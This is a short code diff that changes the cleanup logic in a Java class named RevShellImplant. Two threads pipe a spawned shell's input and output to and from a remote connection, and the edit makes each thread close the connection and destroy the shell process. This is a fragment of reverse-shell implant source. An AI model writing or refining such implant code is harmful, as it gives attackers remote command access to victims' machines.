@@ -106,13 +106,15 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
                 Thread pipe1 = new Thread(() -> {
                     transfer(fromShell, toRemote);
-                    closeAll(fromShell, toShell, fromRemote, toRemote, connection);
+                    closeAll(connection);
+                    shell.destroy();
                 });
                 pipe1.start();
 
                 Thread pipe2 = new Thread(() -> {
                     transfer(fromRemote, toShell);
-                    closeAll(fromShell, toShell, fromRemote, toRemote, connection);
+                    closeAll(connection);
+                    shell.destroy();
                 });
                 pipe2.start();
 
